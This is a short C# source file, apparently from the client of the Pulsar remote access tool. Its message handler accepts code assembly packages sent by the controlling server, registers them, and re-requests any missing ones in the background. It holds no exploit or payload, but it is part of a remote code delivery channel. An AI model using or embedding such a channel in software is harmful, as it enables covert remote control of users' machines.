using Pulsar.Client.Config;
using Pulsar.Client.Utilities;
using Pulsar.Common.Messages;
using Pulsar.Common.Messages.Other;
using Pulsar.Common.Networking;
using System.Diagnostics;
using System.Threading;

namespace Pulsar.Client.Messages
{
    /// <summary>
    /// Receives deferred assembly packages from the server and forwards them to the manager.
    /// </summary>
    public class DeferredAssemblyHandler : IMessageProcessor
    {
        public bool CanExecute(IMessage message) => message is DeferredAssembliesPackage;

        public bool CanExecuteFrom(ISender sender) => true;

        public void Execute(ISender sender, IMessage message)
        {
            var package = message as DeferredAssembliesPackage;
            if (package == null)
            {
                Debug.WriteLine("[DeferredAssemblyHandler] Received invalid package.");
                return;
            }

            DeferredAssemblyManager.RegisterPackage(package);

            var remaining = DeferredAssemblyManager.GetMissingAssemblies();
            if (remaining != null && remaining.Length > 0)
            {
                Debug.WriteLine($"[DeferredAssemblyHandler] Still missing {remaining.Length} deferred assemblies, requesting again.");
                ThreadPool.QueueUserWorkItem(_ =>
                {
                    try
                    {
                        sender.Send(new RequestDeferredAssemblies
                        {
                            Assemblies = remaining,
                            ClientVersion = Settings.ReportedVersion
                        });
                    }
                    catch (System.Exception ex)
                    {
                        Debug.WriteLine($"[DeferredAssemblyHandler] Failed to re-request deferred assemblies: {ex.Message}");
                    }
                });
            }
        }
    }
}
